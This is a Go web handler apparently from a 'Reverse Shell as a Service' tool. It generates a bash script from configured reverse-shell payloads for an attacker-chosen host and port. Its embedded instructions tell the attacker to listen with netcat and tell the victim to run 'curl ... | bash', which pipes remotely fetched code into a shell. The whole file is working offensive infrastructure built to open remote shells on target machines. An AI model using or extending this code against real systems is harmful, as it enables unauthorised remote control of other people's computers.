package api

import (
	"fmt"
	"net/http"
	"strconv"
	"text/template"

	"github.com/gin-gonic/gin"
	"sh.ieki.xyz/global"
)

func GenReverseShellPayloadAPI(c *gin.Context) {
	lhost := c.Param("lhost")
	lport, err := strconv.Atoi(c.Param("lport"))

	if err != nil {
		c.String(http.StatusRequestedRangeNotSatisfiable, "something wrong")
	}

	script := `# Reverse Shell as a Service
#
# 1. On Attacker Machine:
#      nc -l {{.LPort}}
#
# 2. On The Target Machine:
#      curl http://{{.ServerUrl}} | bash
#
# 3. Enjoy it.
`
	for _, Payload := range global.SERVER_CONFIG.ReverseShellPayloadList {
		script += fmt.Sprintf(`if command -v %s > /dev/null 2>&1; then
		%s
		exit;
fi
`, Payload.Command, Payload.Payload)
	}

	scriptTmpl, _ := template.New("script").Parse(script)

	scriptTmpl.Execute(c.Writer, struct {
		ServerUrl string
		LHost     string
		LPort     int
	}{
		ServerUrl: c.Request.Host + c.Request.RequestURI,
		LHost:     lhost,
		LPort:     lport,
	})
}
